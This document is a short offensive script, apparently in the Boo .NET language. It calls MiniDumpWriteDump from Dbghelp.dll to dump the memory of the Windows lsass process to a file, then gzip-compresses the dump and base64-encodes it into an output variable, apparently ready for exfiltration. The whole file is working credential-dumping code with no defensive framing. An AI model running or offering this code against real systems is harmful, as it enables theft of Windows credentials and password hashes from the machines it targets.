import System.Runtime.InteropServices
from System.Diagnostics import Process
from System import Convert
from System.IO.Compression import GZipStream, CompressionMode
from System.IO import FileStream, FileMode, FileAccess, FileShare, File, MemoryStream

[DllImport("Dbghelp.dll", EntryPoint:"MiniDumpWriteDump")]
def minidumpwritedump(hProcess as int, ProcessId as int, hFile as int, DumpType as int, ExceptionParam as int, UserStreamParam as int, CallbackParam as int):
    pass

output = ''
procname = 'lsass'
file = "DUMPFILE_PATH"

ids = Process.GetProcessesByName(procname)
for pid in ids:
    using fs = FileStream(file, FileMode.Create, FileAccess.ReadWrite, FileShare.Write):
        minidumpwritedump(pid.Handle, pid.Id, fs.Handle,0x00000002,0,0,0)

using mso = MemoryStream():
    using gzip = GZipStream(mso, CompressionMode.Compress, true):
        dmpfile = File.ReadAllBytes(file)
        gzip.Write(dmpfile, 0, dmpfile.Length)
        output = Convert.ToBase64String(mso.ToArray())
